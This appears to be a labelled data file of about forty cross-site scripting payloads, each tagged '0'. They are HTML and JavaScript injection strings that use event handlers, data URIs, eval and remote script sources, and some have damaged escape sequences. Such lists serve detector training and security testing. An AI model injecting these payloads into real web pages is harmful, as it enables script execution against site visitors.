<embed/<a/onload=alert();?n<script type="text/javascript">	0
<embed/onload=al?u0065rt();?n<script type="text/javascript">	0
<embed/src=# onload=confirm();?n<script type="text/javascrip t">	0
<frameset><frame/onload=alert(1); />	0
<iframe onload=alert``; /><select	0
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="></iframe>	0
<iframe src=# <keygen onload=alert();?n<script></script>	0
<iframe/*/onload=charset=alert();>	0
<iframe/onload=alert();>size=<command	0
<iframe/onload=alert(1); />	0
<img src= <meter onerror=alert();?n<script></script>	0
<img src=# <keygen onerror=?u0061lert``;>	0
<img src=x alt=confirm(1) onmouseover=eval(alt)>	0
<keygen name="confirm(1)" onfocus="eval(this.name);" autofocus>	0
<object/data=evil.html #</a>	0
<object/onload="onfocus=alert();"<script type="text/javascri pt">	0
<object/src=# onload=alert();?n<script type="text/javascript ">	0
<object/src=x onload=alert(1);?n<script type="text/javascript">	0
<progress </caption><video><source <body onerror=alert();	0
<script src="data:text/html,al?u0065rt``;"<script></script>	0
<script src="http://example.com/xss.jpg"></script>	0
<script src=# <label onerror=confirm();?n<script></script>	0
<script/src="data:text/html,alert();"<script></script>	0
<script>al?u0065rt();</script></tr><th/	0
<script>al?u0065rt();</script></tr><th/	0
<script>onerror=?u0061lert(1);</script>	0
<style><img src='</style><img src=x onerror=alert(1)//'>	0
<svg/<canvas/<select/onload=confirm();>	0
<svg/<canvas/<select/onload=confirm(1);>	0
<svg/onload="?u0061lert();"></output>	0
<svg/onload=al?u0065rt();?n<script type="text/javascript">	0
<svg/onload=alert(1); </del>	0
<svg><style><img/src=x onerror=alert(1)// </b>	0
<video><source <tfoot <td onerror=javascript:window.onerror=alert();alert();	0
al?u0065rt();<script>confirm();</script>	0
colspan=<iframe <a onload=al?u0065rt();>	0
icon=<body <input/onload=confirm(1);>	0
icon=<iframe/<body onload=?u0061lert();>	0
icon=<iframe/<img onload=al?u0065rt();>	0
javascript:\u0061lert();</script><frameset><basefont/</td>	0
kind=<body <img onload=alert``;>	0
onerror=javascript:window.onerror=alert();</td><video><source onerror=javascript:window.onerror=alert();script:al\u0065rt();	0
